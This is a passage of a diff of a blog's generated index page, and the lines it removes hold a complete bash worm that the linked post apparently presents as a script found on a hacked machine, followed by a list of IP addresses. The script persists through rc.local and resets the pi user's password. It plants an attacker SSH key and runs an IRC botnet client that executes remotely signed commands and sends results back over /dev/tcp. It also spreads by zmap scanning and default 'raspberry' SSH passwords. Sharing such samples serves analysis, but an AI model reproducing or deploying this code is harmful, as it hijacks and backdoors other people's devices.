class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">MYSELF=`realpath <span class="variable">$0</span>`</span><br><span class="line">DEBUG=/dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$MYSELF</span> &gt;&gt; <span class="variable">$DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	NEWMYSELF=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line">	sudo cp <span class="variable">$MYSELF</span> /opt/<span class="variable">$NEWMYSELF</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo &#x27;#!/bin/sh -e&#x27; &gt; /etc/rc.local&quot;</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo /opt/<span class="variable">$NEWMYSELF</span> &gt;&gt; /etc/rc.local&quot;</span></span><br><span class="line">	sudo sh -c <span class="string">&quot;echo &#x27;exit 0&#x27; &gt;&gt; /etc/rc.local&quot;</span></span><br><span class="line">	sleep 1</span><br><span class="line">	sudo reboot</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">TMP1=`mktemp`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TMP1</span> &gt;&gt; <span class="variable">$DEBUG</span></span><br><span class="line"></span><br><span class="line">killall bins.sh</span><br><span class="line">killall minerd</span><br><span class="line">killall node</span><br><span class="line">killall nodejs</span><br><span class="line">killall ktx-armv4l</span><br><span class="line">killall ktx-i586</span><br><span class="line">killall ktx-m68k</span><br><span class="line">killall ktx-mips</span><br><span class="line">killall ktx-mipsel</span><br><span class="line">killall ktx-powerpc</span><br><span class="line">killall ktx-sh4</span><br><span class="line">killall ktx-sparc</span><br><span class="line">killall arm5</span><br><span class="line">killall zmap</span><br><span class="line">killall kaiten</span><br><span class="line">killall perl</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 bins.deutschland-zahlung.eu&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">rm -rf /root/.bashrc</span><br><span class="line">rm -rf /home/pi/.bashrc</span><br><span class="line"></span><br><span class="line">usermod -p \<span class="variable">$6</span>\<span class="variable">$vGkGPKUr</span>\<span class="variable">$heqvOhUzvbQ66Nb0JGCijh</span>/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi</span><br><span class="line"></span><br><span class="line">mkdir -p /root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B&quot;</span>  &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> &gt;&gt; /etc/resolv.conf</span><br><span class="line">rm -rf /tmp/ktx*</span><br><span class="line">rm -rf /tmp/cpuminer-multi</span><br><span class="line">rm -rf /var/tmp/kaiten</span><br><span class="line"></span><br><span class="line">cat &gt; /tmp/public.pem &lt;&lt;<span class="string">EOFMARKER</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs</span></span><br><span class="line"><span class="string">glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW</span></span><br><span class="line"><span class="string">rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF</span></span><br><span class="line"><span class="string">WRq+Z8HYMvPlgSRA3wIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOFMARKER</span></span><br><span class="line"></span><br><span class="line">BOT=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line"></span><br><span class="line">cat &gt; /tmp/<span class="variable">$BOT</span> &lt;&lt;<span class="string">&#x27;EOFMARKER&#x27;</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SYS=`uname -a | md5sum | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">NICK=a<span class="variable">$&#123;SYS:24&#125;</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">	arr[0]=<span class="string">&quot;ix1.undernet.org&quot;</span></span><br><span class="line">	arr[1]=<span class="string">&quot;ix2.undernet.org&quot;</span></span><br><span class="line">	arr[2]=<span class="string">&quot;Ashburn.Va.Us.UnderNet.org&quot;</span></span><br><span class="line">	arr[3]=<span class="string">&quot;Bucharest.RO.EU.Undernet.Org&quot;</span></span><br><span class="line">	arr[4]=<span class="string">&quot;Budapest.HU.EU.UnderNet.org&quot;</span></span><br><span class="line">	arr[5]=<span class="string">&quot;Chicago.IL.US.Undernet.org&quot;</span></span><br><span class="line">	rand=$[<span class="variable">$RANDOM</span> % 6]</span><br><span class="line">	svr=<span class="variable">$&#123;arr[$rand]&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;exec 3&lt;&gt;/dev/tcp/$svr/6667;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$NICK</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;NICK $NICK\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;USER user 8 * :IRC hi\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Main loop</span></span><br><span class="line">	<span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line">		<span class="built_in">eval</span> <span class="string">&quot;read msg_in &lt;&amp;3;&quot;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">break</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>  [[ <span class="string">&quot;<span class="variable">$msg_in</span>&quot;</span> =~ <span class="string">&quot;PING&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">printf</span> <span class="string">&quot;PONG %s\n&quot;</span> <span class="string">&quot;<span class="variable">$&#123;msg_in:5&#125;</span>&quot;</span>;</span><br><span class="line">			<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;PONG %s\r\n&quot; &quot;$&#123;msg_in:5&#125;&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">			<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">			sleep 1</span><br><span class="line">			<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;JOIN #biret\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">			<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$msg_in</span>&quot;</span> =~ <span class="string">&quot;PRIVMSG&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">			privmsg_h=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 3)</span><br><span class="line">			privmsg_data=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 4)</span><br><span class="line">			privmsg_nick=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 2 | cut -d<span class="string">&#x27;!&#x27;</span> -f 1)</span><br><span class="line"></span><br><span class="line">			<span class="built_in">hash</span>=`<span class="built_in">echo</span> <span class="variable">$privmsg_data</span> | base64 -d -i | md5sum | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">			sign=`<span class="built_in">echo</span> <span class="variable">$privmsg_h</span> | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$sign</span>&quot;</span> == <span class="string">&quot;<span class="variable">$hash</span>&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">				CMD=`<span class="built_in">echo</span> <span class="variable">$privmsg_data</span> | base64 -d -i`</span><br><span class="line">				RES=`bash -c <span class="string">&quot;<span class="variable">$CMD</span>&quot;</span> | base64 -w 0`</span><br><span class="line">				<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;PRIVMSG $privmsg_nick :$RES\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">				<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">fi</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">EOFMARKER</span><br><span class="line"></span><br><span class="line">chmod +x /tmp/<span class="variable">$BOT</span></span><br><span class="line">nohup /tmp/<span class="variable">$BOT</span> 2&gt;&amp;1 &gt; /tmp/bot.log &amp;</span><br><span class="line">rm /tmp/nohup.log -rf</span><br><span class="line">rm -rf nohup.out</span><br><span class="line">sleep 3</span><br><span class="line">rm -rf /tmp/<span class="variable">$BOT</span></span><br><span class="line"></span><br><span class="line">NAME=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line"></span><br><span class="line">date &gt; /tmp/.s</span><br><span class="line"></span><br><span class="line">apt-get update -y --force-yes</span><br><span class="line">apt-get install zmap sshpass -y --force-yes</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line">	FILE=`mktemp`</span><br><span class="line">	zmap -p 22 -o <span class="variable">$FILE</span> -n 100000</span><br><span class="line">	killall ssh scp</span><br><span class="line">	<span class="keyword">for</span> IP <span class="keyword">in</span> `cat <span class="variable">$FILE</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="variable">$MYSELF</span> pi@<span class="variable">$IP</span>:/tmp/<span class="variable">$NAME</span>  &amp;&amp; <span class="built_in">echo</span> <span class="variable">$IP</span> &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberry ssh pi@<span class="variable">$IP</span> -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="string">&quot;cd /tmp &amp;&amp; chmod +x <span class="variable">$NAME</span> &amp;&amp; bash -c ./<span class="variable">$NAME</span>&quot;</span> &amp;</span><br><span class="line">		sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="variable">$MYSELF</span> pi@<span class="variable">$IP</span>:/tmp/<span class="variable">$NAME</span>  &amp;&amp; <span class="built_in">echo</span> <span class="variable">$IP</span> &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberryraspberry993311 ssh pi@<span class="variable">$IP</span> -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="string">&quot;cd /tmp &amp;&amp; chmod +x <span class="variable">$NAME</span> &amp;&amp; bash -c ./<span class="variable">$NAME</span>&quot;</span> &amp;</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	rm -rf <span class="variable">$FILE</span></span><br><span class="line">	sleep 10</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>ip<br>18.132.196.152<br>102.37.42.55<br>46.30.234.60<br>46.30.234.60<br>79.98.159.7<br>79.98.159.7<br>54.153.54.230<br>81.151.94.19<br>138.68.91.250<br>138.68.91.250<br>35.200.133.234<br>35.200.133.234<br>68.169.61.66<br>77.240.100.215<br>77.240.100.215<br>54.92.204.47<br>206.189.139.95<br>206.189.139.95<br>54.233.114.207<br>198.199.120.102<br>198.199.120.102<br>81.196.205.195<br>81.196.205.195<br>13.52.183.6<br>68.183.228.248<br>68.183.228.248<br>81.196.205.210<br>81.196.205.210<br>134.209.89.233<br>134.209.89.233<br>153.196.173.38<br>153.196.173.38<br>167.172.119.82</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/28/yuque/%E8%A2%AB%E9%BB%91%E8%84%9A%E6%9C%AC/">展开全文 >></a>
+          <a class="article-more-a" href="/2021/06/28/yuque/linux%E7%B3%BB%E7%BB%9F%EF%BC%88Ubuntu%EF%BC%89%E4%B9%8B%E5%90%88%E4%B8%8A%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%BD%86%E4%B8%8D%E6%96%AD%E7%BD%91/">展开全文 >></a>
         </p>
       
 
@@ -1173,7 +1282,7 @@ var _hmt = _hmt || [];
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
     </nav>
   
 
@@ -1185,7 +1294,7 @@ var _hmt = _hmt || [];
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021 Murphy Yi
+    		&copy; 2022 Murphy Yi
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -1293,15 +1402,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">learn</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">java</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">mysql</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1313,15 +1414,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">read</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">数据库</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+                <a href="javascript:void(0)" class="js-tag color1">learn</a>
               </li>
             
             <div class="clearfix"></div>
